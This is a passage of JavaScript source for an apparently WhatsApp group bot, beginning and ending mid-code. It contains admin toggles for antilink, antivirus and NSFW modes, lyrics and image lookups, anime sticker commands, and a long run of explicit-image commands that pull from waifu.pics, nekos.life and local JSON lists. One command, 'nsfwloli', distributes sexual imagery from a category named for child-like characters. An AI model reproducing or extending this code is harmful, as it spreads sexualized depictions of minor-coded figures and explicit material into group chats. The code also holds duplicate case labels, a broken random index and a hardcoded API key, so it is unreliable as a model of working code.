m.reply('Success in turning off antitoxic in this group')
} else {
  let buttonsnttoxic= [
  { buttonId: `${command.split(prefix)[1]} on`, buttonText: { displayText: 'On' }, type: 1 },
  { buttonId: `${command.split(prefix)[1]} off`, buttonText: { displayText: 'Off' }, type: 1 }
  ]
  await conn.sendButtonText(m.chat, buttonsnttoxic, `Please click the button below\n\nOn to enable\nOff to disable`, `${global.botname}`, m)
  }
  }
  break
case prefix+'autoreply': {
if (!m.isGroup) return m.reply(mess.group)
if (!isBotAdmins) return m.reply(mess.botAdmin)
if (!isAdmins && !isCreator) return m.reply(mess.admin)
if (args[1] === "on") {
if (Autoreply) return m.reply('Already activated')
autorep.push(from)
fs.writeFileSync('./database/autoreply.json', JSON.stringify(autorep))
m.reply('Success in turning on auto reply in this group')
var groupe = await conn.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
conn.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nAuto reply has been enabled in this group, means bot may send unnecessary voice note!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[1] === "off") {
if (!Autoreply) return m.reply('Already deactivated')
let off = autorep.indexOf(from)
autorep.splice(off, 1)
fs.writeFileSync('./database/autoreply.json', JSON.stringify(autorep))
m.reply('Success in turning off auto reply in this group')
} else {
  let buttonsnttoxic= [
  { buttonId: `${command} on`, buttonText: { displayText: 'On' }, type: 1 },
  { buttonId: `${command} off`, buttonText: { displayText: 'Off' }, type: 1 }
  ]
  await conn.sendButtonText(m.chat, buttonsnttoxic, `Please click the button below\n\nOn to enable\nOff to disable`, `${global.botname}`, m)
  }
  }
  break
case prefix+'antilink': {
if (!m.isGroup) return m.reply(mess.group)
if (!isBotAdmins) return m.reply(mess.botAdmin)
if (!isAdmins && !isCreator) return m.reply(mess.admin)
if (args[1] === "on") {
if (Antilinkgc) return m.reply('Already activated')
ntlinkgc.push(from)
fs.writeFileSync('./database/antilinkgc.json', JSON.stringify(ntlinkgc))
m.reply('Success in turning on antiwame in this group')
var groupe = await conn.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
conn.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nNobody is allowed to send group link in this group, one who sends will be kicked immediately!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[1] === "off") {
if (!Antilinkgc) return m.reply('Already deactivated')
let off = ntlinkgc.indexOf(from)
ntlinkgc.splice(off, 1)
fs.writeFileSync('./database/antilinkgc.json', JSON.stringify(ntlinkgc))
m.reply('Success in turning off antiwame in this group')
} else {
    let buttons = [
        { buttonId: `${command} on`, buttonText: { displayText: 'ON' }, type: 1 },
        { buttonId: `${command} off`, buttonText: { displayText: 'OFF' }, type: 1 }
    ]
  await conn.sendButtonText(m.chat, buttons, `Please click the button below\n\nOn to enable\nOff to disable`, `${global.botname}`, m)
  }
  }
  break
case prefix+'autostc':   case prefix+'autosticker':{
if (!m.isGroup) return m.reply(mess.group)
if (!isBotAdmins) return m.reply(mess.botAdmin)
if (!isAdmins && !isCreator) return m.reply(mess.admin)
//if (args.length < 2) return m.reply('type auto sticker on to enable\ntype auto sticker off to disable')
if (args[1]  === 'on'){
if (isAutoSticker) return m.reply(`Already activated`)
autosticker.push(from)
fs.writeFileSync('./database/autosticker.json', JSON.stringify(autosticker))
m.reply('autosticker activated')
} else if (args[1] === 'off'){
let anuticker1 = autosticker.indexOf(from)
autosticker.splice(anuticker1, 1)
fs.writeFileSync('./database/autosticker.json', JSON.stringify(autosticker))
m.reply('auto sticker deactivated')
} else {
    let buttons = [
        { buttonId: `${command} on`, buttonText: { displayText: 'ON' }, type: 1 },
        { buttonId: `${command} off`, buttonText: { displayText: 'OFF' }, type: 1 }
    ]
  await conn.sendButtonText(m.chat, buttons, `Please click the button below\n\nOn to enable\nOff to disable`, `${global.botname}`, m)
  }
}
break
case prefix+'antivirus': case prefix+'antivirtex': {
if (!m.isGroup) return m.reply(mess.group)
if (!isBotAdmins) return m.reply(mess.botAdmin)
if (!isAdmins && !isCreator) return m.reply(mess.admin)
if (args[1] === "on") {
if (antiVirtex) return m.reply('Already activated')
ntvirtex.push(from)
fs.writeFileSync('./database/antivirus.json', JSON.stringify(ntvirtex))
m.reply('Success in turning on antivirus in this group')
var groupe = await conn.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
conn.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nNo body is allowed to send virus in this group, member who send will be kicked immediately!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[1] === "off") {
if (!antiVirtex) return m.reply('Already deactivated')
let off = ntvirtex.indexOf(from)
ntvirtex.splice(off, 1)
fs.writeFileSync('./database/antivirus.json', JSON.stringify(ntvirtex))
m.reply('Success in turning off antivirus this group')
} else {
  let buttonsntvirtex = [
  { buttonId: `${command} on`, buttonText: { displayText: 'On' }, type: 1 },
  { buttonId: `${command} off`, buttonText: { displayText: 'Off' }, type: 1 }
  ]
  await conn.sendButtonText(m.chat, buttonsntvirtex, `Please click the button below\n\nOn to enable\nOff to disable`, `${global.botname}`, m)
  }
  }
  break
case prefix+'nsfw': {
if (!m.isGroup) return m.reply(mess.group)
//if (!isBotAdmins) return m.reply(mess.botAdmin)
if (!isAdmins && !isCreator) return m.reply(mess.admin)
if (args[1] === "on") {
if (isNsfw) return m.reply('Already activated')
ntnsfw.push(from)
fs.writeFileSync('./database/nsfw.json', JSON.stringify(ntnsfw))
m.reply('Success in turning on nsfw in this group')
var groupe = await conn.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
conn.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nNsfw(not safe for work) feature has been enabled in this group, which means one can access sexual graphics from the bot!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[1] === "off") {
if (!isNsfw) return m.reply('Already deactivated')
let off = ntnsfw.indexOf(from)
ntnsfw.splice(off, 1)
fs.writeFileSync('./database/nsfw.json', JSON.stringify(ntnsfw))
m.reply('Success in turning off nsfw in this group')
} else {
  let buttons = [
  { buttonId: `${command} on`, buttonText: { displayText: 'On' }, type: 1 },
  { buttonId: `${command} off`, buttonText: { displayText: 'Off' }, type: 1 }
  ]
  await conn.sendButtonText(m.chat, buttons, `Please click the button below\n\nOn to enable\nOff to disable`, `${global.botname}`, m)
  }
  }
  break
case prefix+'lyrics2':    case prefix+'lirik': {
	    if (!text) return reply(`Use example ${prefix}lyrics Despacito`)
	m.reply(mess.wait)
	const { lyrics, lyricsv2 } = require('@bochilteam/scraper')
    const result = await lyricsv2(text).catch(async _ => await lyrics(text))
    m.reply(`
• Title : *${result.title}*
• Author : ${result.author}
• Lyrics : ${result.lyrics}
• Url : ${result.link}
`.trim())
}
break
case prefix+'lyrics':   case prefix+'lirik':  
if (!text) throw `Song name?`
const findLyrics = require('simple-find-lyrics')
try {
const lyrics = await findLyrics(text)
if (lyrics.lyrics == '') return console.log("it's f up")
var txt = `
*• Title :* ${lyrics.title}
*• Artist :* ${lyrics.artist}
*• Lyrics :-* \n
${lyrics.lyrics}`
console.log(lyrics)
 await conn.sendMessage(m.chat, {text:txt},{quoted:m})
} catch (err) {
    console.log(err)
    }
    break
    case prefix + "googleimage":   case prefix + "gimage": {
      if (!q) throw `input query`;
      await m.reply(mess.wait);
      let result = await gis(q);
      console.log(result)
      if (!result) throw `Gambar Yang Kamu Cari Tidak Dapat Ditemukan!`;
      let randomize = result[Math.floor(Math.random() * result.length)];
      checked = await fetch(randomize.url);
      if (checked.status != 200)
        throw `Error ${checked.status} *${checked.statusText}*`;
      conn.sendMessage(
        m.chat,
        {
          image: {
            url: randomize.url,
          },
          caption: `Source : ${randomize.url}`,
        },
        {
          quoted: m,
        }
      ).catch(err => {
        return('Error!')
      })
    }
      break;
case prefix+'emoji': {
if (!args.join(" ")) return m.reply('Where is the emoji?')
emoji.get(args.join(" ")).then(async(emoji) => {
let mese = await conn.sendMessage(m.chat, {image:{url:emoji.images[4].url}, caption: `Made by ${global.botname}`}, {quoted:m})
await conn.sendMessage(from, {text:"reply #s to this image to make sticker"}, {quoted:mese})
})
}
break
case prefix+'woof':
case prefix+'8ball':
case prefix+'goose':
case prefix+'gecg':
case prefix+'feed':
case prefix+'avatar':
case prefix+'lizard':
case prefix+'meow':
case prefix+'tickle':
m.reply(mess.wait)						
 waifudd = await axios.get(`https://nekos.life/api/v2/img/${command.split(prefix)[1]}`)
                           var wbuttsss = [
        {buttonId: `.${command.split(prefix)[1]}`, buttonText: {displayText: `Next ✨`}, type: 1},
        ]
      let buttonssMessages = {
       image: {url:waifudd.data.url},
       caption:  `Here you go!`,
      footer: `${global.botname}`,
      buttons: wbuttsss,
      headerType: 4
      }     
            await conn.sendMessage(m.chat, buttonssMessages,{ quoted:m }).catch(err => {
                    return('Error!')
                })
break
case prefix+'animewallpaper': case prefix+'animewall': {
                if (!args.join(" ")) return m.reply("What wallpaper are you looking for??")
		let { wallpaper } = require('./lib/scraperW')
                anu = await wallpaper(args)
                result = anu[Math.floor(Math.random() * anu.length)]
		let buttons = [
                    {buttonId: `.wallpaper ${args.join(" ")}`, buttonText: {displayText: 'Next Image'}, type: 1}
                ]
                let buttonMessage = {
                    image: { url: result.image[0] },
                    caption: `Title : ${result.title}\nCategory : ${result.type}\nDetail : ${result.source}\nMedia Url : ${result.image[2] || result.image[1] || result.image[0]}`,
                    footer: `${botname}`,
                    buttons: buttons,
                    headerType: 4
                }
                conn.sendMessage(m.chat, buttonMessage, { quoted: m })
            }
            break
case prefix+'animewall2': case prefix+'animewallpaper2':
m.reply(mess.wait)						
const { AnimeWallpaper } =require("anime-wallpaper")
if(!q) return m.reply('What wallpaper do you want?')
const wall = new AnimeWallpaper();
    const pages = [1,2,3,4];
        const random=pages[Math.floor(Math.random() * pages.length)]
        const wallpaper = await wall
            .getAnimeWall4({ title: q, type: "sfw", page: pages })
            .catch(() => null);
const i = Math.floor(Math.random() * wallpaper.length);
var walb = [
        {buttonId: `.${command.split(prefix)[1]} ${q}`, buttonText: {displayText: `Next ✨`}, type: 1},        
        ]
      let wal = {
       image: {url:wallpaper[i].image},
       caption: `*Query :* ${q}`,
      footer: `${global.botname}`,
      buttons: walb,
      headerType: 4
      }     
            await conn.sendMessage(m.chat, wal,{ quoted:m }).catch(err => {
                    return('Error!')
                })
//conn.sendMessage(m.chat,{image:{url:wallpaper[i].image},caption:`*Query :* ${q}`})            
break
case prefix+'cry':case prefix+'kill':case prefix+'hug':case prefix+'pat':case prefix+'lick':case prefix+'kiss':case prefix+'bite':case prefix+'yeet':case prefix+'neko':case prefix+'bully':case prefix+'bonk':case prefix+'wink':case prefix+'poke':case prefix+'nom':case prefix+'slap':case prefix+'smile':case prefix+'wave':case prefix+'awoo':case prefix+'blush':case prefix+'smug':case prefix+'glomp':case prefix+'happy':case prefix+'dance':case prefix+'cringe':case prefix+'cuddle':case prefix+'highfive':case prefix+'shinobu':case prefix+'megumin':case prefix+'handhold':
					axios.get(`https://api.waifu.pics/sfw/${command.split(prefix)[1]}`)
					.then(({data}) => {
						conn.sendImageAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
					})
					break
case prefix+'loli-waifu':
					m.reply(mess.wait)
					axios.get(`https://api.waifu.pics/sfw/waifu`)
					.then(({data}) => {
					conn.sendImage(m.chat, data.url, mess.success, m)
					})
					break
case prefix+'hentaivid': case prefix+'hentai': {
	if (!m.isGroup) return m.reply(mess.group)
if (!isNsfw) return m.reply(mess.nsfw)
                const { hentai } = require('./lib/scraper.js')
                anu = await hentai()
                result912 = anu[Math.floor(Math.random(), anu.length)]
                conn.sendMessage(m.chat, { video: { url: result912.video_1 }, caption: `• Title : ${result912.title}\n• Category : ${result912.category}\n• Mimetype : ${result912.type}\n• Views : ${result912.views_count}\n• Shares : ${result912.share_count}\n• Source : ${result912.link}\n• Media Url : ${result912.video_1}` }, { quoted: m }).catch(err => {return('Error!')})
            }
            break
case prefix+'trap' :
if (!m.isGroup) return m.reply(mess.group)
if (!isNsfw) return m.reply(mess.nsfw)
 waifudd = await axios.get(`https://waifu.pics/api/nsfw/${command.split(prefix)[1]}`)       
 let trapbot = [
    {buttonId: `trap`, buttonText: {displayText: `Next ⚡`}, type: 1},
    ]
  let button2Messages = {
   image: {url:waifudd.data.url},
   caption:  `Here you go!`,
  buttons: trapbot,
  headerType: 1
  }     
            await conn.sendMessage(m.chat, button2Messages, { quoted:m }).catch(err => {
                    return('Error!')
                })
break
case prefix+'hentai-neko' :
case prefix+'hneko' :
if (!m.isGroup) return m.reply(mess.group)
if (!isNsfw) return m.reply(mess.nsfw)
    waifudd = await axios.get(`https://waifu.pics/api/nsfw/neko`)
 let hnekobot = [
    {buttonId: `.hneko`, buttonText: {displayText: `Next ⚡`}, type: 1},
    ]
  let button3Messages = {
   image: {url:waifudd.data.url},
   caption:  `Here you go!`,
  buttons: hnekobot,
  headerType: 1
  }      
            await conn.sendMessage(m.chat, button3Messages, { quoted:m }).catch(err => {
                    return('Error!')
                })
break
case prefix+'hentai-waifu' :
case prefix+'nwaifu' :
if (!m.isGroup) return m.reply(mess.group)
if (!isNsfw) return m.reply(mess.nsfw)
m.reply(mess.wait)
    waifudd = await axios.get(`https://waifu.pics/api/nsfw/waifu`)         
 let nwaifubot = [
    {buttonId: `.hneko`, buttonText: {displayText: `Next ⚡`}, type: 1},
    ]
  let button4Messages = {
   image: {url:waifudd.data.url},
   caption:  `Here you go!`,
  buttons: nwaifubot,
  headerType: 1
  }      
            await conn.sendMessage(m.chat, button4Messages, { quoted:m }).catch(err => {
                    return('Error!')
                })
break
case prefix+'gasm':
if (!m.isGroup) return m.reply(mess.group)
	if (!isNsfw) return m.reply(mess.nsfw)
m.reply(mess.wait)						
 waifudd = await axios.get(`https://nekos.life/api/v2/img/${command.split(prefix)[1]}`)
                           var wbuttsss = [
        {buttonId: `.${command.split(prefix)[1]}`, buttonText: {displayText: `Next ✨`}, type: 1},
        ]
      let buttonsssMessages = {
       image: {url:waifudd.data.url},
       caption:  `Here you go!`,
      footer: `${global.botname}`,
      buttons: wbuttsss,
      headerType: 4
      }     
            await conn.sendMessage(m.chat, buttonsssMessages,{ quoted:m }).catch(err => {
                    return('Error!')
                })
break  
case prefix+'milf':
if (!m.isGroup) return m.reply(mess.group)
var but = [{buttonId: `${command.split(prefix)[1]}`, buttonText: { displayText: "NEXT➡️" }, type: 1 }]
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/milf.json'))
var xeonyresult = pickRandom(ahegaonsfw)
conn.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url }, buttons: but, footer: botname }, { quoted: m })
break 
case prefix+'ahegao':
if (!m.isGroup) return m.reply(mess.group)
	if (!isNsfw) return m.reply(mess.nsfw)
m.reply(mess.wait)
var but = [{buttonId: `${command.split(prefix)[1]}`, buttonText: { displayText: "NEXT➡️" }, type: 1 }]
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/ahegao.json'))
var xeonyresult = pickRandom(ahegaonsfw)
conn.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url }, buttons: but, footer: botname }, { quoted: m })
break
case prefix+'ass':
if (!m.isGroup) return m.reply(mess.group)
	if (!isNsfw) return m.reply(mess.nsfw)
m.reply(mess.wait)
var but = [{buttonId: `${command.split(prefix)[1]}`, buttonText: { displayText: "NEXT➡️" }, type: 1 }]
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/ass.json'))
var xeonyresult = pickRandom(ahegaonsfw)
conn.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url }, buttons: but, footer: botname }, { quoted: m })
break
case prefix+'bdsm':
if (!m.isGroup) return m.reply(mess.group)
	if (!isNsfw) return m.reply(mess.nsfw)
m.reply(mess.wait)
var but = [{buttonId: `${command.split(prefix)[1]}`, buttonText: { displayText: "NEXT➡️" }, type: 1 }]
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/bdsm.json'))
var xeonyresult = pickRandom(ahegaonsfw)
conn.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url }, buttons: but, footer: botname }, { quoted: m })
break
case prefix+'blowjob':
if (!m.isGroup) return m.reply(mess.group)
	if (!isNsfw) return m.reply(mess.nsfw)
m.reply(mess.wait)
var but = [{buttonId: `${command.split(prefix)[1]}`, buttonText: { displayText: "NEXT➡️" }, type: 1 }]
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/blowjob.json'))
var xeonyresult = pickRandom(ahegaonsfw)
conn.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url }, buttons: but, footer: botname }, { quoted: m })
break
case prefix+'cuckold':
if (!m.isGroup) return m.reply(mess.group)
	if (!isNsfw) return m.reply(mess.nsfw)
m.reply(mess.wait)
var but = [{buttonId: `${command.split(prefix)[1]}`, buttonText: { displayText: "NEXT➡️" }, type: 1 }]
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/cuckold.json'))
var xeonyresult = pickRandom(ahegaonsfw)
conn.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url }, buttons: but, footer: botname }, { quoted: m })
break
case prefix+'cum':
if (!m.isGroup) return m.reply(mess.group)
	if (!isNsfw) return m.reply(mess.nsfw)
m.reply(mess.wait)
var but = [{buttonId: `${command.split(prefix)[1]}`, buttonText: { displayText: "NEXT➡️" }, type: 1 }]
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/cum.json'))
var xeonyresult = pickRandom(ahegaonsfw)
conn.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url }, buttons: but, footer: botname }, { quoted: m })
break
case prefix+'eba':
if (!m.isGroup) return m.reply(mess.group)
	if (!isNsfw) return m.reply(mess.nsfw)
m.reply(mess.wait)
var but = [{buttonId: `${command.split(prefix)[1]}`, buttonText: { displayText: "NEXT➡️" }, type: 1 }]
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/eba.json'))
var xeonyresult = pickRandom(ahegaonsfw)
conn.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url }, buttons: but, footer: botname }, { quoted: m })
break
case prefix+'ero':
if (!m.isGroup) return m.reply(mess.group)
	if (!isNsfw) return m.reply(mess.nsfw)
m.reply(mess.wait)
var but = [{buttonId: `${command.split(prefix)[1]}`, buttonText: { displayText: "NEXT➡️" }, type: 1 }]
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/ero.json'))
var xeonyresult = pickRandom(ahegaonsfw)
conn.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url }, buttons: but, footer: botname }, { quoted: m })
break
case prefix+'femdom':
if (!m.isGroup) return m.reply(mess.group)
	if (!isNsfw) return m.reply(mess.nsfw)
m.reply(mess.wait)
var but = [{buttonId: `${command.split(prefix)[1]}`, buttonText: { displayText: "NEXT➡️" }, type: 1 }]
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/femdom.json'))
var xeonyresult = pickRandom(ahegaonsfw)
conn.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url }, buttons: but, footer: botname }, { quoted: m })
break
case prefix+'foot':
if (!m.isGroup) return m.reply(mess.group)
	if (!isNsfw) return m.reply(mess.nsfw)
m.reply(mess.wait)
var but = [{buttonId: `${command.split(prefix)[1]}`, buttonText: { displayText: "NEXT➡️" }, type: 1 }]
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/foot.json'))
var xeonyresult = pickRandom(ahegaonsfw)
conn.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url }, buttons: but, footer: botname }, { quoted: m })
break
case prefix+'gangbang':
if (!m.isGroup) return m.reply(mess.group)
	if (!isNsfw) return m.reply(mess.nsfw)
m.reply(mess.wait)
var but = [{buttonId: `${command.split(prefix)[1]}`, buttonText: { displayText: "NEXT➡️" }, type: 1 }]
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/gangbang.json'))
var xeonyresult = pickRandom(ahegaonsfw)
conn.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url }, buttons: but, footer: botname }, { quoted: m })
break
case prefix+'glasses':
if (!m.isGroup) return m.reply(mess.group)
	if (!isNsfw) return m.reply(mess.nsfw)
m.reply(mess.wait)
var but = [{buttonId: `${command.split(prefix)[1]}`, buttonText: { displayText: "NEXT➡️" }, type: 1 }]
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/glasses.json'))
var xeonyresult = pickRandom(ahegaonsfw)
conn.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url }, buttons: but, footer: botname }, { quoted: m })
break
case prefix+'hentai':
if (!m.isGroup) return m.reply(mess.group)
	if (!isNsfw) return m.reply(mess.nsfw)
m.reply(mess.wait)
var but = [{buttonId: `${command.split(prefix)[1]}`, buttonText: { displayText: "NEXT➡️" }, type: 1 }]
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/hentai.json'))
var xeonyresult = pickRandom(ahegaonsfw)
conn.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url }, buttons: but, footer: botname }, { quoted: m })
break
case prefix+'jahy':
if (!m.isGroup) return m.reply(mess.group)
	if (!isNsfw) return m.reply(mess.nsfw)
m.reply(mess.wait)
var but = [{buttonId: `${command.split(prefix)[1]}`, buttonText: { displayText: "NEXT➡️" }, type: 1 }]
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/jahy.json'))
var xeonyresult = pickRandom(ahegaonsfw)
conn.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url }, buttons: but, footer: botname }, { quoted: m })
break
case prefix+'manga':
if (!m.isGroup) return m.reply(mess.group)
	if (!isNsfw) return m.reply(mess.nsfw)
m.reply(mess.wait)
var but = [{buttonId: `${command.split(prefix)[1]}`, buttonText: { displayText: "NEXT➡️" }, type: 1 }]
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/manga.json'))
var xeonyresult = pickRandom(ahegaonsfw)
conn.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url }, buttons: but, footer: botname }, { quoted: m })
break
case prefix+'masturbation':
if (!m.isGroup) return m.reply(mess.group)
	if (!isNsfw) return m.reply(mess.nsfw)
m.reply(mess.wait)
var but = [{buttonId: `${command.split(prefix)[1]}`, buttonText: { displayText: "NEXT➡️" }, type: 1 }]
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/masturbation.json'))
var xeonyresult = pickRandom(ahegaonsfw)
conn.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url }, buttons: but, footer: botname }, { quoted: m })
break
case prefix+'neko-hentai':
if (!m.isGroup) return m.reply(mess.group)
	if (!isNsfw) return m.reply(mess.nsfw)
m.reply(mess.wait)
var but = [{buttonId: `${command.split(prefix)[1]}`, buttonText: { displayText: "NEXT➡️" }, type: 1 }]
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/neko.json'))
var xeonyresult = pickRandom(ahegaonsfw)
conn.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url }, buttons: but, footer: botname }, { quoted: m })
break
case prefix+'neko-hentai2':
if (!m.isGroup) return m.reply(mess.group)
	if (!isNsfw) return m.reply(mess.nsfw)
m.reply(mess.wait)
var but = [{buttonId: `${command.split(prefix)[1]}`, buttonText: { displayText: "NEXT➡️" }, type: 1 }]
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/neko2.json'))
var xeonyresult = pickRandom(ahegaonsfw)
conn.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url }, buttons: but, footer: botname }, { quoted: m })
break
case prefix+'nsfwloli':
if (!m.isGroup) return m.reply(mess.group)
	if (!isNsfw) return m.reply(mess.nsfw)
m.reply(mess.wait)
var but = [{buttonId: `${command.split(prefix)[1]}`, buttonText: { displayText: "NEXT➡️" }, type: 1 }]
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/nsfwloli.json'))
var xeonyresult = pickRandom(ahegaonsfw)
conn.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url }, buttons: but, footer: botname }, { quoted: m })
break
case prefix+'orgy':
if (!m.isGroup) return m.reply(mess.group)
	if (!isNsfw) return m.reply(mess.nsfw)
m.reply(mess.wait)
var but = [{buttonId: `${command.split(prefix)[1]}`, buttonText: { displayText: "NEXT➡️" }, type: 1 }]
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/orgy.json'))
var xeonyresult = pickRandom(ahegaonsfw)
conn.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url }, buttons: but, footer: botname }, { quoted: m })
break
case prefix+'panties':
if (!m.isGroup) return m.reply(mess.group)
	if (!isNsfw) return m.reply(mess.nsfw)
m.reply(mess.wait)
var but = [{buttonId: `${command.split(prefix)[1]}`, buttonText: { displayText: "NEXT➡️" }, type: 1 }]
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/panties.json'))
var xeonyresult = pickRandom(ahegaonsfw)
conn.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url }, buttons: but, footer: botname }, { quoted: m })
break
case prefix+'pussy':
if (!m.isGroup) return m.reply(mess.group)
	if (!isNsfw) return m.reply(mess.nsfw)
m.reply(mess.wait)
var but = [{buttonId: `${command.split(prefix)[1]}`, buttonText: { displayText: "NEXT➡️" }, type: 1 }]
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/pussy.json'))
var xeonyresult = pickRandom(ahegaonsfw)
conn.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url }, buttons: but, footer: botname }, { quoted: m })
break
case prefix+'tentacles':
if (!m.isGroup) return m.reply(mess.group)
	if (!isNsfw) return m.reply(mess.nsfw)
m.reply(mess.wait)
var but = [{buttonId: `${command.split(prefix)[1]}`, buttonText: { displayText: "NEXT➡️" }, type: 1 }]
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/tentacles.json'))
var xeonyresult = pickRandom(ahegaonsfw)
conn.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url }, buttons: but, footer: botname }, { quoted: m })
break
case prefix+'thights':
if (!m.isGroup) return m.reply(mess.group)
	if (!isNsfw) return m.reply(mess.nsfw)
m.reply(mess.wait)
var but = [{buttonId: `${command.split(prefix)[1]}`, buttonText: { displayText: "NEXT➡️" }, type: 1 }]
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/thights.json'))
var xeonyresult = pickRandom(ahegaonsfw)
conn.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url }, buttons: but, footer: botname }, { quoted: m })
break
case prefix+'yuri':
if (!m.isGroup) return m.reply(mess.group)
	if (!isNsfw) return m.reply(mess.nsfw)
m.reply(mess.wait)
var but = [{buttonId: `${command.split(prefix)[1]}`, buttonText: { displayText: "NEXT➡️" }, type: 1 }]
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/yuri.json'))
var xeonyresult = pickRandom(ahegaonsfw)
conn.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url }, buttons: but, footer: botname }, { quoted: m })
break
case prefix+'zettai':
if (!m.isGroup) return m.reply(mess.group)
	if (!isNsfw) return m.reply(mess.nsfw)
m.reply(mess.wait)
var but = [{buttonId: `${command.split(prefix)[1]}`, buttonText: { displayText: "NEXT➡️" }, type: 1 }]
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/zettai.json'))
var xeonyresult = pickRandom(ahegaonsfw)
conn.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url }, buttons: but, footer: botname }, { quoted: m })
break
case prefix+'gifblowjob':
if (!m.isGroup) return m.reply(mess.group)
if (!isNsfw) return m.reply(mess.nsfw)
m.reply(mess.wait)
  let assss = await axios.get ("https://api.waifu.pics/nsfw/blowjob")
    var bobuff = await fetchBuffer(assss.data.url)
    var bogif = await buffergif(bobuff)
    await conn.sendMessage(m.chat,{video:bogif, gifPlayback:true },{quoted:m}).catch(err => {
    })
    break
case prefix+'gifhentai':
if (!m.isGroup) return m.reply(mess.group)
if (!isNsfw) return m.reply(mess.nsfw)
m.reply(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/gifs.json'))
var xeonyresultx = pickRandom(ahegaonsfw)
    await conn.sendMessage(m.chat,{video:xeonyresultx, gifPlayback:true },{quoted:m}).catch(err => {
    })
    break
case'slap2':
if(!quoted){
const   result = await fetchJson(`https://g.tenor.com/v1/random?q=anime slapping&key=LIVDSRZULELA`, {method: 'get'})
const ku = result.results[0]
const oj = ku.media[0]
const urlg = oj.mp4
const slapp = urlg.url
const { data: mediaData } = await axios.get(slapp, {responseType: "arraybuffer"})
const media = new MessageMedia(
    'video/mp4', 
    mediaData.toString("base64")
);
const mention = msg
const mentionedId = await conn.getName(mention.mentionedIds)
ctv = `@${contacts.number} *Slapped* @${mentionedId.number}`
const ahh = []
m.reply(media,m.chat , {mentions:[contacts,mentionedId], sendVideoAsGif:true, caption: ctv}).then((r) => {
})
}else if(quoted){
const qmid = quoted.author
